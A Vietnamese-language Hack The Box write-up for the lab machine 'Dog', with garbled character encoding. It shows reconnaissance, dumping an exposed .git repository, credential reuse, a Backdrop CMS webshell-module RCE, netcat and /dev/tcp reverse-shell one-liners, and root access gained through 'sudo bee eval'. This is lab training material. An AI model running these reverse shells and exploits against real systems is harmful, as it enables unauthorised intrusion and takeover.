AAAAC3NzaC1lZDI1NTE5AAAAIPMpkoATGAIWQVbEl67rFecNZySrzt944Y/hWAyq4dPc 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS | http-robots.txt: 22 disallowed entries | /core/ /profiles/ /README.md /web.config /admin | /comment/reply /filter/tips /node/add /search /user/register | /user/password /user/login /user/logout /?q=admin /?q=comment/reply | /?q=filter/tips /?q=node/add /?q=search /?q=user/password |_/?q=user/register /?q=user/login /?q=user/logout |_http-favicon: Unknown favicon MD5: 3836E83A3E835A26D789DDA9E78C5510 |_http-generator: Backdrop CMS 1 (https://backdropcms.org) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Home | Dog Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Enumeration and Gaining access # Vhost, directories # TÃ¬m directories\n301 309B http://10.10.11.58/.git -\u0026gt; REDIRECTS TO: http://10.10.11.58/.git/ 200 73B http://10.10.11.58/.git/description 200 95B http://10.10.11.58/.git/COMMIT_EDITMSG 200 23B http://10.10.11.58/.git/HEAD 200 604B http://10.10.11.58/.git/ 200 409B http://10.10.11.58/.git/branches/ 200 92B http://10.10.11.58/.git/config 200 240B http://10.10.11.58/.git/info/exclude 200 476B http://10.10.11.58/.git/logs/ 200 650B http://10.10.11.58/.git/hooks/ 200 455B http://10.10.11.58/.git/info/ 200 230B http://10.10.11.58/.git/logs/HEAD 301 319B http://10.10.11.58/.git/logs/refs -\u0026gt; REDIRECTS TO: http://10.10.11.58/.git/logs/refs/ 301 325B http://10.10.11.58/.git/logs/refs/heads -\u0026gt; REDIRECTS TO: http://10.10.11.58/.git/logs/refs/heads/ 301 320B http://10.10.11.58/.git/refs/heads -\u0026gt; REDIRECTS TO: http://10.10.11.58/.git/refs/heads/ 200 230B http://10.10.11.58/.git/logs/refs/heads/master 200 461B http://10.10.11.58/.git/refs/ 200 41B http://10.10.11.58/.git/refs/heads/master 301 319B http://10.10.11.58/.git/refs/tags -\u0026gt; REDIRECTS TO: http://10.10.11.58/.git/refs/tags/ 200 337KB http://10.10.11.58/.git/index 200 2KB http://10.10.11.58/.git/objects/ 403 276B http://10.10.11.58/.ht_wsr.txt 403 276B http://10.10.11.58/.htaccess.bak1 403 276B http://10.10.11.58/.htaccess.sample 403 276B http://10.10.11.58/.htaccess.orig 403 276B http://10.10.11.58/.htaccess.save 403 276B http://10.10.11.58/.htaccess_orig 403 276B http://10.10.11.58/.htaccess_extra 403 276B http://10.10.11.58/.htaccess_sc 403 276B http://10.10.11.58/.htaccessOLD 403 276B http://10.10.11.58/.htaccessOLD2 403 276B http://10.10.11.58/.htaccessBAK 403 276B http://10.10.11.58/.html 403 276B http://10.10.11.58/.htm 403 276B http://10.10.11.58/.htpasswd_test 403 276B http://10.10.11.58/.httr-oauth 403 276B http://10.10.11.58/.htpasswds 403 276B http://10.10.11.58/.php 301 309B http://10.10.11.58/core -\u0026gt; REDIRECTS TO: http://10.10.11.58/core/ 301 310B http://10.10.11.58/files -\u0026gt; REDIRECTS TO: http://10.10.11.58/files/ 200 586B http://10.10.11.58/files/ 404 2KB http://10.10.11.58/index.php/login/ 200 456B http://10.10.11.58/layouts/ 200 7KB http://10.10.11.58/LICENSE.txt 301 312B http://10.10.11.58/modules -\u0026gt; REDIRECTS TO: http://10.10.11.58/modules/ 200 399B http://10.10.11.58/modules/ 200 5KB http://10.10.11.58/README.md 200 528B http://10.10.11.58/robots.txt 403 276B http://10.10.11.58/server-status/ 403 276B http://10.10.11.58/server-status 200 0B http://10.10.11.58/settings.php 301 310B http://10.10.11.58/sites -\u0026gt; REDIRECTS TO: http://10.10.11.58/sites/ 301 311B http://10.10.11.58/themes -\u0026gt; REDIRECTS TO: http://10.10.11.58/themes/ 200 454B http://10.10.11.58/themes/ TÃ¬m vhost, tuy nhiÃªn tÃ´i khÃ´ng tÃ¬m tháº¥y vhost nÃ o. Quay trá»Ÿ láº¡i cÃ¡c directories thÃ¬ tÃ´i cÃ³ git.\n.git # Sá»­ dá»¥ng git-dumper Ä‘á»ƒ dump Ä‘Æ°á»£c repo nÃ y ra\nneo@fs0c13ty ~/htb/machines/dog$ git-dumper http://10.10.11.58/.git/ dumped_repo [-] Testing http://10.10.11.58/.git/HEAD [200] [-] Testing http://10.10.11.58/.git/ [200] [-] Fetching .git recursively [-] Fetching http://10.10.11.58/.git/ [200] [-] Fetching http://10.10.11.58/.gitignore [404] [-] http://10.10.11.58/.gitignore responded with status code 404 [-] Fetching http://10.10.11.58/.git/objects/ [200] [-] Fetching http://10.10.11.58/.git/logs/ [200] ....... [-] Fetching http://10.10.11.58/.git/objects/e6/d15eb7293e0fdbb869080b6b5ff42810df6726 [200] [-] Fetching http://10.10.11.58/.git/objects/e6/f614f30aa8fd1c3e1cc2e1983b4d30f16ea3cd [200] [-] Fetching http://10.10.11.58/.git/objects/e6/fe4d122e7f434cffa1bede170208a54f526552 [200] [-] Sanitizing .git/config [-] Running git checkout . Updated 2873 paths from the index neo@fs0c13ty ~/htb/machines/dog$ ll dumped_repo total 80K drwxr-xr-x 9 neo neo 4.0K Apr 14 14:08 core drwxr-xr-x 7 neo neo 4.0K Apr 14 14:08 files -rwxr-xr-x 1 neo neo 578 Apr 14 14:08 index.php drwxr-xr-x 2 neo neo 4.0K Apr 14 14:08 layouts -rwxr-xr-x 1 neo neo 18K Apr 14 14:08 LICENSE.txt -rwxr-xr-x 1 neo neo 5.2K Apr 14 14:08 README.md -rwxr-xr-x 1 neo neo 1.2K Apr 14 14:08 robots.txt -rwxr-xr-x 1 neo neo 22K Apr 14 14:08 settings.php drwxr-xr-x 2 neo neo 4.0K Apr 14 14:08 sites drwxr-xr-x 2 neo neo 4.0K Apr 14 14:08 themes settings.php\nneo@fs0c13ty ~/htb/machines/dog$ cat dumped_repo/settings.php \u0026lt;?php /** * @file * Main Backdrop CMS configuration file. */ /** * Database configuration: * * Most sites can configure their database by entering the connection string * below. If using primary/replica databases or multiple connections, see the * advanced database documentation at * https://api.backdropcms.org/database-configuration */ $database = \u0026#39;mysql://root:BackDropJ*******DS2024@127.0.0.1/backdrop\u0026#39;; $database_prefix = \u0026#39;\u0026#39;; /** * Site configuration files location. Váº­y lÃ  á»Ÿ Ä‘Ã¢y tÃ´i biáº¿t Ä‘Æ°á»£c server sá»­ dá»¥ng mysql vÃ  cÃ³ pass cá»§a root khi login mysql. Tuy nhiÃªn chá»‰ lÃ  db trÃªn local, khÃ´ng thá»ƒ login tá»« bÃªn ngoÃ i do port 3306 khÃ´ng má»Ÿ. TÃ´i sáº½ lÆ°u nÃ³ láº¡i vÃ  tiáº¿p tá»¥c Ä‘Ã o sÃ¢u hÆ¡n vÃ  git repo nÃ y.\nTÃ¬m kiáº¿m cÃ¡c thÃ´ng tin cÆ¡ báº£n nhÆ° username, password, mysql, config.php, domain, \u0026hellip; tÃ´i tÃ¬m tháº¥y 1 user\nneo@fs0c13ty ~/htb/machines/dog$ grep -rni \u0026#34;@dog.htb\u0026#34; ./dumped_repo ./dumped_repo/files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:12: \u0026#34;tiffany@dog.htb\u0026#34; Thá»­ login ssh vá»›i thÃ´ng tin Ä‘Ã£ thu tháº­p Ä‘Æ°á»£c: tiffany:BackDropJ2024DS2024 nhÆ°ng khÃ´ng cÃ³ káº¿t quáº£, váº­y thÃ¬ cÃ³ 2 kháº£ nÄƒng xáº£y ra á»Ÿ Ä‘Ã¢y:\nPassword cá»§a user tiffany sai. KhÃ´ng tá»“n táº¡i user tiffany trong mÃ¡y chá»§. Tuy nhiÃªn thÃ¬ táº¡m thá»i chÆ°a cÃ³ cÃ¡ch nÃ o Ä‘á»ƒ check Ä‘Æ°á»£c 2 trÆ°á»ng há»£p nÃ y, brute-force chá»‰ lÃ  phÆ°Æ¡ng Ã¡n cuá»‘i cÃ¹ng.\nBackdrop CMS # TÃ´i cÃ²n nguyÃªn 1 trang web chÆ°a check. Giá» lÃ  lÃºc vÃ o xem nÃ³ cÃ³ gÃ¬.\nNhÃ¬n má»™t lÆ°á»£t thÃ¬ tÃ´i cÃ³ thÃªm 2 author lÃ  dogBackDropSystem vÃ  Anonymous, Ä‘Ã¢y cÅ©ng cÃ³ thá»ƒ lÃ  2 user Ä‘á»ƒ login Ä‘Æ°á»£c vÃ o trang web.\nQuay trá»Ÿ láº¡i pháº§n directories phÃ­a trÃªn thÃ¬ tÃ´i cÃ³ /robots.txt\n# # robots.txt # # This file is to prevent the crawling and indexing of certain parts # of your site by web crawlers and spiders run by sites like Yahoo! # and Google. By telling these \u0026#34;robots\u0026#34; where not to go on your site, # you save bandwidth and server resources. # # This file will be ignored unless it is at the root of your host: # Used: http://example.com/robots.txt # Ignored: http://example.com/site/robots.txt # # For more information about the robots.txt standard, see: # http://www.robotstxt.org/robotstxt.html # # For syntax checking, see: # http://www.robotstxt.org/checker.html User-agent: * Crawl-delay: 10 # Directories Disallow: /core/ Disallow: /profiles/ # Files Disallow: /README.md Disallow: /web.config # Paths (clean URLs) Disallow: /admin Disallow: /comment/reply Disallow: /filter/tips Disallow: /node/add Disallow: /search Disallow: /user/register Disallow: /user/password Disallow: /user/login Disallow: /user/logout # Paths (no clean URLs) Disallow: /?q=admin Disallow: /?q=comment/reply Disallow: /?q=filter/tips Disallow: /?q=node/add Disallow: /?q=search Disallow: /?q=user/password Disallow: /?q=user/register Disallow: /?q=user/login Disallow: /?q=user/logout TÃ´i cÃ³ cáº£ pháº§n login vÃ  register á»Ÿ Ä‘Ã¢y, nhÆ°ng khÃ´ng truy cáº­p register Ä‘á»ƒ Ä‘Äƒng kÃ½ tÃ i khoáº£n má»›i, nÃªn tÃ´i sáº½ thá»­ login vá»›i nhá»¯ng gÃ¬ tÃ´i Ä‘ang cÃ³.\nSau khi thá»­ cÃ¡c kháº£ nÄƒng vá»›i cÃ¡c username:password Ä‘Ã£ cÃ³ thÃ¬ tÃ´i Ä‘Ã£ login Ä‘Æ°á»£c vá»›i tiffany:BackDropJ2024DS2024\nXem Wappalyzer, tÃ´i biáº¿t Ä‘Æ°á»£c web dÃ¹ng Backdrop - 1 CMS Ä‘Æ°á»£c phÃ¡t triá»ƒn dá»±a trÃªn Drupal. TÃ¬m kiáº¿m lá»— há»•ng cá»§a Backdrop 1 trÃªn Exploit-DB, tÃ´i tÃ¬m Ä‘Æ°á»£c Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE)\nPhÃ¢n tÃ­ch exploit nÃ y má»™t chÃºt, Backdrop cho phÃ©p ngÆ°á»i dÃ¹ng admin upload module dáº¡ng .zip hoáº·c .tar.gz thÃ´ng qua GUI /admin/modules/install. Exploit sáº½ táº¡o 1 webshell php, nÃ©n nÃ³ dÆ°á»›i dáº¡ng zip vÃ  táº£i lÃªn nhÆ° 1 module giáº£. Cuá»‘i cÃ¹ng truy cáº­p webshell báº±ng Ä‘Æ°á»ng dáº«n /modules/shell/shell.php\nÄáº§u tiÃªn táº¡o file zip chÆ°a webshell\nneo@fs0c13ty ~/htb/machines/dog$ python 52021.py http://10.10.11.58 Backdrop CMS 1.27.1 - Remote Command Execution Exploit Evil module generating... Evil module generated! shell.zip Go to http://10.10.11.58/admin/modules/install and upload the shell.zip for Manual Installation. Your shell address: http://10.10.11.58/modules/shell/shell.php neo@fs0c13ty ~/htb/machines/dog$ ll total 32K -rwxr-xr-x 1 neo neo 2.6K Apr 13 13:52 52021.py -rw-r--r-- 1 neo neo 3.0K Apr 13 13:14 dirsearch.txt drwxr-xr-x 8 neo neo 4.0K Apr 14 14:08 dumped_repo drwxr-xr-x 7 neo neo 4.0K Apr 13 13:16 GitTools -rw-r--r-- 1 neo neo 2.4K Apr 13 12:18 nmap drwxr-xr-x 2 neo neo 4.0K Apr 13 13:13 reports drwxr-xr-x 2 neo neo 4.0K Apr 15 15:58 shell -rw-r--r-- 1 neo neo 1.1K Apr 15 15:58 shell.zip Tiáº¿p theo vÃ o pháº§n modules trÃªn GUI Ä‘á»ƒ táº£i lÃªn module\nFunctionality -\u0026gt; Install new modules -\u0026gt; Manual installation\nÄá»ƒ táº£i lÃªn Ä‘Æ°á»£c file zip, buá»™c pháº£i chá»n vÃ o option 3: Upload a module, theme, or layout archive to install\nTuy nhiÃªn Ä‘á»ƒ upload file thÃ¬ cáº§n chuyá»ƒn nÃ³ tá»« .zip sang .tar.gz vÃ  cuá»‘i cÃ¹ng chá»n INSTALL\nneo@fs0c13ty ~/htb/machines/dog$ tar -czf shell.tar.gz shell/ neo@fs0c13ty ~/htb/machines/dog$ ll total 36K -rwxr-xr-x 1 neo neo 2.6K Apr 13 13:52 52021.py -rw-r--r-- 1 neo neo 3.0K Apr 13 13:14 dirsearch.txt drwxr-xr-x 8 neo neo 4.0K Apr 14 14:08 dumped_repo drwxr-xr-x 7 neo neo 4.0K Apr 13 13:16 GitTools -rw-r--r-- 1 neo neo 2.4K Apr 13 12:18 nmap drwxr-xr-x 2 neo neo 4.0K Apr 13 13:13 reports drwxr-xr-x 2 neo neo 4.0K Apr 15 15:58 shell -rw-r--r-- 1 neo neo 671 Apr 15 16:00 shell.tar.gz -rw-r--r-- 1 neo neo 1.1K Apr 15 15:58 shell.zip Truy cáº­p láº¡i vÃ o link webshell nhÆ° trong code exploit\nhttp://10.10.11.58/modules/shell/shell.php\nTÃ´i sáº½ thÃªm payload Ä‘á»ƒ láº¥y revershell\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\u0026gt;\u0026amp;1|nc 10.10.14.135 9001 \u0026gt;/tmp/f\nMá»™t lÆ°u Ã½ nhá» á»Ÿ Ä‘Ã¢y lÃ  webshell cÃ³ bá»‹ máº¥t sau 1 lÃºc sá»­ dá»¥ng, chá»‰ cáº§n install láº¡i modules nhÆ° cÃ¡c bÆ°á»›c á»Ÿ trÃªn lÃ  dÃ¹ng tiáº¿p Ä‘Æ°á»£c bÃ¬nh thÆ°á»ng.\nBáº­t listener vá»›i port 9001\nneo@fs0c13ty ~/htb/machines/dog$ nc -lnvp 9001 listening on [any] 9001 ... connect to [10.10.14.135] from (UNKNOWN) [10.10.11.58] 54348 bash: cannot set terminal process group (889): Inappropriate ioctl for device bash: no job control in this shell www-data@dog:/var/www/html/modules/shell$ www-data@dog:/var/www/html/modules/shell$ cat /etc/passwd cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:113:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin jobert:x:1000:1000:jobert:/home/jobert:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash _laurel:x:997:997::/var/log/laurel:/bin/false www-data@dog:/var/www/html/modules/shell$ ls -la /home ls -la /home total 16 drwxr-xr-x 4 root root 4096 Aug 15 2024 . drwxr-xr-x 19 root root 4096 Feb 7 18:31 .. drwxr-xr-x 4 jobert jobert 4096 Feb 7 15:59 jobert drwxr-xr-x 3 johncusack johncusack 4096 Feb 7 15:59 johncusack Hiá»‡n táº¡i tÃ´i cÃ³ 2 user jobert vÃ  johncusack, theo nhÆ° trong file passwd thÃ¬ permission cá»§a jobert cao hÆ¡n.\nTÃ´i sáº½ thá»­ password tÃ´i Ä‘Ã£ cÃ³ vá»›i cáº£ 2 user nÃ y.\nwww-data@dog:/var/www/html/modules/shell$ su jobert su jobert Password: BackDropJ*******DS2024 su: Authentication failure www-data@dog:/var/www/html/modules/shell$ su johncusack su johncusack Password: BackDropJ*******DS2024 shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory id uid=1001(johncusack) gid=1001(johncusack) groups=1001(johncusack) neo@fs0c13ty ~$ ssh johncusack@10.10.11.58 johncusack@10.10.11.58\u0026#39;s password: Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/pro System information as of Tue 15 Apr 2025 09:44:21 AM UTC System load: 0.02 Usage of /: 48.2% of 6.32GB Memory usage: 24% Swap usage: 0% Processes: 242 Users logged in: 1 IPv4 address for eth0: 10.10.11.58 IPv6 address for eth0: dead:beef::250:56ff:feb9:7f76 Expanded Security Maintenance for Applications is not enabled. 0 updates can be applied immediately. Enable ESM Apps to receive additional future security updates. See https://ubuntu.com/esm or run: sudo pro status The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Tue Apr 15 08:43:27 2025 from 10.10.14.58 johncusack@dog:~$ ls user.txt johncusack@dog:~$ Privilege escalation # sudo -l\njohncusack@dog:~$ sudo -l [sudo] password for johncusack: Matching Defaults entries for johncusack on dog: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User johncusack may run the following commands on dog: (ALL : ALL) /usr/local/bin/bee TÃ¬m hiá»ƒu thÃ´ng tin vá» tháº±ng bee nÃ y\njohncusack@dog:~$ strings /usr/local/bin/bee #!/usr/bin/env php \u0026lt;?php * @file * A command line utility for Backdrop CMS. // Exit gracefully with a meaningful message if installed within a web // accessible location and accessed in the browser. if (!bee_is_cli()) { echo bee_browser_load_html(); die(); // Set custom error handler. set_error_handler(\u0026#39;bee_error_handler\u0026#39;); // Include files. require_once __DIR__ . \u0026#39;/includes/miscellaneous.inc\u0026#39;; require_once __DIR__ . \u0026#39;/includes/command.inc\u0026#39;; require_once __DIR__ . \u0026#39;/includes/render.inc\u0026#39;; require_once __DIR__ . \u0026#39;/includes/filesystem.inc\u0026#39;; require_once __DIR__ . \u0026#39;/includes/input.inc\u0026#39;; require_once __DIR__ . \u0026#39;/includes/globals.inc\u0026#39;; // Main execution code. bee_initialize_server(); bee_parse_input(); bee_initialize_console(); bee_process_command(); bee_print_messages(); bee_display_output(); exit(); * Custom error handler for `bee`. * @param int $error_level * The level of the error. * @param string $message * Error message to output to the user. * @param string $filename * The file that the error came from. * @param int $line * The line number the error came from. * @param array $context * An array of all variables from where the error was triggered. * @see https://www.php.net/manual/en/function.set-error-handler.php * @see _backdrop_error_handler() function bee_error_handler($error_level, $message, $filename, $line, array $context = NULL) { require_once __DIR__ . \u0026#39;/includes/errors.inc\u0026#39;; _bee_error_handler_real($error_level, $message, $filename, $line, $context); * Detects whether the current script is running in a command-line environment. function bee_is_cli() { return (empty($_SERVER[\u0026#39;SERVER_SOFTWARE\u0026#39;]) \u0026amp;\u0026amp; (php_sapi_name() == \u0026#39;cli\u0026#39; || (is_numeric($_SERVER[\u0026#39;argc\u0026#39;]) \u0026amp;\u0026amp; $_SERVER[\u0026#39;argc\u0026#39;] \u0026gt; 0))); * Return the HTML to display if this page is loaded in the browser. * @return string * The concatentated html to display. function bee_browser_load_html() { // Set the title to use in h1 and title elements. $title = \u0026#34;Bee Gone!\u0026#34;; // Place a white block over \u0026#34;#!/usr/bin/env php\u0026#34; as this is output before // anything else. $browser_output = \u0026#34;\u0026lt;div style=\u0026#39;background-color:white;position:absolute;width:15rem;height:3rem;top:0;left:0;z-index:9;\u0026#39;\u0026gt;\u0026amp;nbsp;\u0026lt;/div\u0026gt;\u0026#34;; // Add the bee logo and style appropriately. $browser_output .= \u0026#34;\u0026lt;img src=\u0026#39;./images/bee.png\u0026#39; align=\u0026#39;right\u0026#39; width=\u0026#39;150\u0026#39; height=\u0026#39;157\u0026#39; style=\u0026#39;max-width:100%;margin-top:3rem;\u0026#39;\u0026gt;\u0026#34;; // Add meaningful text. $browser_output .= \u0026#34;\u0026lt;h1 style=\u0026#39;font-family:Tahoma;\u0026#39;\u0026gt;$title\u0026lt;/h1\u0026gt;\u0026#34;; $browser_output .= \u0026#34;\u0026lt;p style=\u0026#39;font-family:Verdana;\u0026#39;\u0026gt;Bee is a command line tool only and will not work in the browser.\u0026lt;/p\u0026gt;\u0026#34;; // Add the document title using javascript when the window loads. $browser_output .= \u0026#34;\u0026lt;script\u0026gt;window.onload = function(){document.title=\u0026#39;$title\u0026#39;;}\u0026lt;/script\u0026gt;\u0026#34;; // Output the combined string. return $browser_output; á» dÃ²ng Ä‘Ã¢u tiÃªn Ä‘Ã£ cung cáº¥p cho tÃ´i biáº¿t Ä‘Ã¢y lÃ  1 CLI cá»§a Backdrop CMS. Äi há»i Chatgpt thÃ¬ nÃ³ Ä‘Æ°a cho tÃ´i 1 sá»‘ gá»£i Ã½ vá» viá»‡c leo thang Ä‘áº·c quyá»n dá»±a vÃ o tháº±ng bee nÃ y. Äáº§u tiÃªn lÃ  xem vÃ  phÃ¢n tÃ­ch cÃ¡c options cá»§a nÃ³\njohncusack@dog:~$ sudo /usr/local/bin/bee help ğŸ Bee Usage: bee [global-options] \u0026lt;command\u0026gt; [options] [arguments] Global Options: --root Specify the root directory of the Backdrop installation to use. If not set, will try to find the Backdrop installation automatically based on the current directory. --site Specify the directory name or URL of the Backdrop site to use (as defined in \u0026#39;sites.php\u0026#39;). If not set, will try to find the Backdrop site automatically based on the current directory. --base-url Specify the base URL of the Backdrop site, such as https://example.com. May be useful with commands that output URLs to pages on the site. --yes, -y Answer \u0026#39;yes\u0026#39; to questions without prompting. --debug, -d Enables \u0026#39;debug\u0026#39; mode, in which \u0026#39;debug\u0026#39; and \u0026#39;log\u0026#39; type messages will be displayed (in addition to all other messages). ..... ÄÆ°a háº¿t pháº§n help nÃ y cho ChatGPT thÃ¬ nÃ³ Ä‘Æ°a ra cho tÃ´i gá»£i Ã½ vá» option eval\njohncusack@dog:~$ sudo /usr/local/bin/bee help | grep eval eval ev, php-eval TÃ´i cÃ³ thá»ƒ thá»±c thi mÃ£ PHP tÃ¹y Ã½ vá»›i quyá»n root sau khi bootstrap Backdrop.\nÄá»c thÃªm vá» eval, tÃ´i sáº½ thá»­ cÃ¢u lá»‡nh execute shell\nsudo /usr/local/bin/bee eval 'shell_exec(\u0026quot;/bin/bash -c \\'bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.135/4444 0\u0026gt;\u0026amp;1\\'\u0026quot;);'\nBáº­t listener vá»›i port 4444 trÆ°á»›c khi cháº¡y payload\nnc -lnvp 4444\njohncusack@dog:~$ sudo /usr/local/bin/bee eval \u0026#39;shell_exec(\u0026#34;/bin/bash -c \\\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.135/4444 0\u0026gt;\u0026amp;1\\\u0026#34;\u0026#34;);\u0026#39; âœ˜ The required bootstrap level for \u0026#39;eval\u0026#39; is not ready. Tuy nhiÃªn bÃªn shell cá»§a tÃ´i láº¡i hiá»‡n lá»—i\nneo@fs0c13ty ~$ nc -lvnp 4444 listening on [any] 4444 ... connect to [10.10.14.135] from (UNKNOWN) [10.10.11.58] 33130 -bash: 1\u0026#34;);: ambiguous redirect Quay ra há»i ChatGPT thÃ¬ nÃ³ báº£o\nTÃ³m láº¡i cÃ¡ch sá»­a lÃ  tÃ´i pháº£i tÃ¬m thÆ° má»¥c mÃ£ nguá»“n cá»§a Backdrop, nÆ¡i chá»©a file settings.php vÃ  Ä‘áº·t nÃ³ thÃ nh --root vÃ  Ä‘áº·t --site thÃ nh default\nTÃ¬m thÆ° má»¥c chá»©a settings.php\njohncusack@dog:~$ ll /var/www/ total 12 drwxr-xr-x 3 root root 4096 Jul 8 2024 ./ drwxr-xr-x 13 root root 4096 Aug 15 2024 ../ drwxrwxr-x 9 www-data www-data 4096 Apr 15 07:45 html/ johncusack@dog:~$ ll /var/www/html/ total 904 drwxrwxr-x 9 www-data www-data 4096 Apr 15 07:45 ./ drwxr-xr-x 3 root root 4096 Jul 8 2024 ../ drwxrwx--- 9 www-data www-data 4096 Jul 8 2024 core/ drwxrwx--- 8 www-data www-data 4096 Apr 15 13:39 files/ drwxr-xr-x 8 root root 4096 Feb 7 21:22 .git/ -rwxrwx--- 1 www-data www-data 578 Mar 7 2024 index.php* drwxrwx--- 2 www-data www-data 4096 Jul 8 2024 layouts/ -rwxrwx--- 1 www-data www-data 18092 Mar 7 2024 LICENSE.txt* -rw-rw-rw- 1 www-data www-data 824745 Oct 18 03:45 linpeas.sh drwxrwx--- 2 www-data www-data 4096 Apr 15 13:42 modules/ -rwxrwx--- 1 www-data www-data 5285 Mar 7 2024 README.md* -rwxrwx--- 1 www-data www-data 1198 Mar 7 2024 robots.txt* -rwxrwx--- 1 www-data www-data 21732 Jul 8 2024 settings.php* drwxrwx--- 2 www-data www-data 4096 Jul 8 2024 sites/ drwxrwx--- 2 www-data www-data 4096 Jul 8 2024 themes/ Sá»­a láº¡i payload vÃ  cháº¡y nÃ³ trÃªn mÃ¡y victim. Táº¥t nhiÃªn lÃ  trÆ°á»›c Ä‘Ã³ pháº£i báº­t láº¡i listener\njohncusack@dog:~$ sudo /usr/local/bin/bee --root=/var/www/html --site=default eval \u0026#39;shell_exec(\u0026#34;/bin/bash -c \\\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.135/4444 0\u0026gt;\u0026amp;1\\\u0026#34;\u0026#34;);\u0026#39; neo@fs0c13ty ~$ nc -lvnp 4444 1 â†µ listening on [any] 4444 ... connect to [10.10.14.135] from (UNKNOWN) [10.10.11.58] 35856 root@dog:/var/www/html# id id uid=0(root) gid=0(root) groups=0(root) root@dog:/var/www/html# cd root@dog:~# ls -la ls -la total 44 drwx------ 5 root root 4096 Apr 15 03:11 . drwxr-xr-x 19 root root 4096 Feb 7 18:31 .. lrwxrwxrwx 1 root root 9 Feb 7 15:59 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 root root 3106 Dec 5 2019 .bashrc drwx------ 2 root root 4096 Jan 29 15:49 .cache -rw-r--r-- 1 root root 94 Aug 15 2024 .gitconfig drwxr-xr-x 3 root root 4096 Jul 9 2024 .local lrwxrwxrwx 1 root root 9 Feb 7 15:59 .mysql_history -\u0026gt; /dev/null -rw-r--r-- 1 root root 161 Dec 5 2019 .profile -rw-r----- 1 root root 33 Apr 15 03:11 root.txt -rw-r--r-- 1 root root 66 Jul 11 2024 .selected_editor drwx------ 2 root root 4096 Jul 8 2024 .ssh -rw-r--r-- 1 root root 165 Feb 7 15:59 .wget-hsts ","date":"1 April 2025","externalUrl":null,"permalink":"/ctf/hackthebox/dog/","section":"Ctf","summary":"","title":"Hackthebox - Dog","type":"ctf"},{"content":"","date":"3 March 2025","externalUrl":null,"permalink":"/tags/cve-2024-41817/","section":"Tags","summary":"","title":"CVE-2024-41817","type":"tags"},{"content":"","date":"3 March 2025","externalUrl":null,"permalink":"/tags/gitea/","section":"Tags","summary":"","title":"Gitea","type":"tags"},{"content":" Reconnaissance and Scanning # PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGZG4yHYcDPrtn7U0l+ertBhGBgjIeH9vWnZcmqH0cvmCNvdcDY/ItR3tdB4yMJp0ZTth5itUVtlJJGHRYAZ8Wg= | 256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519) |_ssh-ed25519 